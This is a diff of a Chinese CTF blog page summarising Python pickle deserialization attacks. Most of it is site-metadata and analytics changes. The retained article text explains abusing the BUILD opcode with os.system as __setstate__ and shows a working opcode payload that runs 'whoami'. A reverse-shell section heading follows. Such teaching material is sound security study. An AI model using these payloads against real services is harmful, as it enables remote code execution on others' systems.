@@ -21,7 +21,7 @@
   
   <meta name="theme-color" content="#2f4154">
   <meta name="author" content="dr0n">
-  <meta name="keywords" content="">
+  <meta name="keywords" content="ctf, writeups, web, misc">
   
     <meta name="description" content="python的序列化和反序列化与PHP，Java类似，python的序列化和反序列化就是对象与数据的相互转换，是为了解决对象传输与持久化存储问题 在Python中序列化一般通过pickle模块和json模块实现 pickle模块和json模块提供了dumps()、dump()、loads()、load()四个函数    函数 说明    dump() 对象反序列化到文件对象并存入文件   dump">
 <meta property="og:type" content="article">
@@ -48,9 +48,9 @@
 <meta property="article:published_time" content="2024-01-01T01:00:00.000Z">
 <meta property="article:modified_time" content="2024-04-27T14:04:54.219Z">
 <meta property="article:author" content="dr0n">
-<meta property="article:tag" content="总结">
 <meta property="article:tag" content="python">
 <meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="总结">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://www.dr0n.top/img/summary/python_unserialize-1.png">
   
@@ -94,7 +94,7 @@
   <script id="fluid-configs">
     var Fluid = window.Fluid || {};
     Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"www.dr0n.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":9},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":"G-456TDFZC89"},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"cDl9nch6MITIDFI9oATLRdpm-gzGzoHsz","app_key":"X6LMz3T4TtGGD4SoDAQrR5g4","server_url":"https://api.dr0n.top","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+    var CONFIG = {"hostname":"www.dr0n.top","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":9,"expand_all":true},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":"G-456TDFZC89"},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null},"openkounter":{"server_url":"https://openkounter-1lbvmren.edgeone.cool/","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
 
     if (CONFIG.web_analytics.follow_dnt) {
       var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
@@ -128,13 +128,11 @@
   
 
   
-    
-  
 
 
 
   
-<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Dr0n's blog" type="application/atom+xml">
+<meta name="generator" content="Hexo 8.1.1"><link rel="alternate" href="/atom.xml" title="Dr0n's blog" type="application/atom+xml">
 </head>
 
 
@@ -313,20 +311,13 @@
         
         
         
-          58 分钟
+          64 分钟
         
       </span>
     
 
     
     
-      
-        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          <span id="leancloud-page-views"></span> 次
-        </span>
-        
-      
       
     
   </div>
@@ -526,7 +517,7 @@
 </blockquote>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_build</span>(<span class="hljs-params">self</span>):<br>    stack = <span class="hljs-variable language_">self</span>.stack<br>    <span class="hljs-comment"># 获取栈顶元素</span><br>    state = stack.pop()<br>    <span class="hljs-comment"># 获取栈中倒数第二个元素</span><br>    inst = stack[-<span class="hljs-number">1</span>]<br>    <span class="hljs-comment"># 获取倒数第二个元素的__setstate__属性</span><br>    setstate = <span class="hljs-built_in">getattr</span>(inst, <span class="hljs-string">&quot;__setstate__&quot;</span>, <span class="hljs-literal">None</span>)<br><br>    <span class="hljs-comment"># setstate 不为None则调用inst对象的__setstate，将state作为参数传递给它</span><br>    <span class="hljs-comment"># 一般不存在__setstate__方法，setstate(state)会造成任意函数调用</span><br>    <span class="hljs-keyword">if</span> setstate <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        setstate(state)<br>        <span class="hljs-keyword">return</span><br>    slotstate = <span class="hljs-literal">None</span><br><br>    <span class="hljs-comment"># 如果state是元组类型且长度为2，则将其分解成state, slotstate</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(state, <span class="hljs-built_in">tuple</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(state) == <span class="hljs-number">2</span>:<br>        state, slotstate = state<br><br>    <span class="hljs-keyword">if</span> state:<br>        inst_dict = inst.__dict__<br>        intern = sys.intern<br>        <span class="hljs-comment"># 遍历state字典，将键名赋值给inst_dict，键值直接赋值</span><br>        <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> state.items():<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(k) <span class="hljs-keyword">is</span> <span class="hljs-built_in">str</span>:<br>                inst_dict[intern(k)] = v<br>            <span class="hljs-keyword">else</span>:<br>                inst_dict[k] = v<br><br>    <span class="hljs-keyword">if</span> slotstate:<br>        <span class="hljs-comment"># 遍历slotstate字典，并将其键值对赋值给inst对象</span><br>        <span class="hljs-keyword">for</span> k, v <span class="hljs-keyword">in</span> slotstate.items():<br>            <span class="hljs-built_in">setattr</span>(inst, k, v)<br>dispatch[BUILD[<span class="hljs-number">0</span>]] = load_build<br></code></pre></td></tr></table></figure>
 
-<p>因为一般不存在__setstate__，所以不会触发setstate(state)。但是如果手动压入一个字典<code>&#123;&quot;__setstate__&quot;:os.system&#125;</code>，执行<code>b</code>。就会添加一个新的键值对，再继续压入命令，再执行<code>b</code>时，<code>setstate</code>就不会为None了，而是我们传入的os.system，就是<code>os.system(state)</code>，而state就是我们传入的命令，从而完成rce</p>
+<p>因为一般不存在__setstate__，所以不会触发setstate(state)。但是如果手动压入一个字典<code>{&quot;__setstate__&quot;:os.system}</code>，执行<code>b</code>。就会添加一个新的键值对，再继续压入命令，再执行<code>b</code>时，<code>setstate</code>就不会为None了，而是我们传入的os.system，就是<code>os.system(state)</code>，而state就是我们传入的命令，从而完成rce</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name</span>):<br>        <span class="hljs-variable language_">self</span>.name = <span class="hljs-string">&quot;aa&quot;</span><br><br><br>opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;(c__main__</span><br><span class="hljs-string">Test</span><br><span class="hljs-string">)o(S&quot;__setstate__&quot;</span><br><span class="hljs-string">cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">dbS&quot;whoami&quot;</span><br><span class="hljs-string">b.&#x27;&#x27;&#x27;</span><br><br>pickle.loads(opcode)<br>pickletools.dis(opcode)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">lewiserii\lewiserii</span><br><span class="hljs-string">    0: (    MARK</span><br><span class="hljs-string">    1: c        GLOBAL     &#x27;__main__ Test&#x27;</span><br><span class="hljs-string">   16: )        EMPTY_TUPLE</span><br><span class="hljs-string">   17: o        OBJ        (MARK at 0)</span><br><span class="hljs-string">   18: (    MARK</span><br><span class="hljs-string">   19: S        STRING     &#x27;__setstate__&#x27;</span><br><span class="hljs-string">   35: c        GLOBAL     &#x27;os system&#x27;</span><br><span class="hljs-string">   46: d        DICT       (MARK at 18)</span><br><span class="hljs-string">   47: b    BUILD</span><br><span class="hljs-string">   48: S    STRING     &#x27;whoami&#x27;</span><br><span class="hljs-string">   58: b    BUILD</span><br><span class="hljs-string">   59: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 1</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>
 
 <h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>既然可以执行命令了，那么肯定可以反弹shell了，以下是几种payload</p>
@@ -1023,23 +1014,6 @@
   
 
   
-    
-      <span id="leancloud-site-pv-container" style="display: none">
-        总访问量 
-        <span id="leancloud-site-pv"></span>
-         次
-      </span>
-    
-    
-      <span id="leancloud-site-uv-container" style="display: none">
-        总访客数 
-        <span id="leancloud-site-uv"></span>
-         人
-      </span>
-    
-    
-
-  
 
 </div>
 
@@ -1207,8 +1181,6 @@
 
 
   <script>Fluid.plugins.imageCaption();</script>
-
-  <script defer src="/js/leancloud.js" ></script>
 
   <script  src="/js/local-search.js" ></script>
 
